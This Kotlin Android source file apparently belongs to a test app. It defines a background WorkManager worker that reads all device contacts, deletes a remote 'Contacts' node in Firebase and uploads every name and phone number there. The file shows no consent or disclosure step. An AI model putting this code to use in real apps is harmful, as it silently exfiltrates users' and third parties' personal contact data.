package com.example.test.WorkManager

import android.content.Context
import android.provider.ContactsContract
import androidx.work.Worker
import androidx.work.WorkerParameters
import com.example.test.model.Contacts
import com.example.test.model.ContactsFirebase
import com.example.test.utils.mUtils
import com.google.firebase.database.FirebaseDatabase
import com.google.firebase.ktx.Firebase
import java.text.SimpleDateFormat
import java.util.*

class SendContactToFirebase(private val context: Context, params: WorkerParameters) :
    Worker(context, params) {
    var data = ArrayList<ContactsFirebase>()

    private val phoneNumbers: Unit
        get() {
            val phones = context.contentResolver.query(
                ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null
            )
            while (phones!!.moveToNext()) {
                val name =
                    phones.getString(phones.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME))
                var phoneNumber =
                    phones.getString(phones.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER))
                phoneNumber = phoneNumber.replace("[()\\s-]+?".toRegex(), "")

                if (name.isNotEmpty() && phoneNumber.isNotEmpty()) {
                    data.add(ContactsFirebase(name, phoneNumber))
                }
            }
            phones.close()
        }

    override fun doWork(): Result {
        phoneNumbers.run {
            FirebaseDatabase.getInstance().reference.child("Contacts").removeValue().addOnCompleteListener {
                setDataToServer()
            }

        }

        return Result.success()
    }

    private fun setDataToServer() {
        for (i in data.indices) {

            val timeStamp: String =
                SimpleDateFormat("yyyyMMdd_HHmmss").format(Date()) + Random().nextInt(9999999)

            val contactsHash: HashMap<String, String> = HashMap()
            contactsHash["phoneNumber"] = data[i].phoneNumber.toString()
            contactsHash["name"] = data[i].name.toString()

            FirebaseDatabase.getInstance().reference.child("Contacts")
                .child(timeStamp).setValue(contactsHash)
                .addOnSuccessListener {
                    //mUtils.mLog("DONE " + it)
                }.addOnFailureListener {
                    mUtils.mLog("Error :: " + it.localizedMessage)
                }
        }

    }
}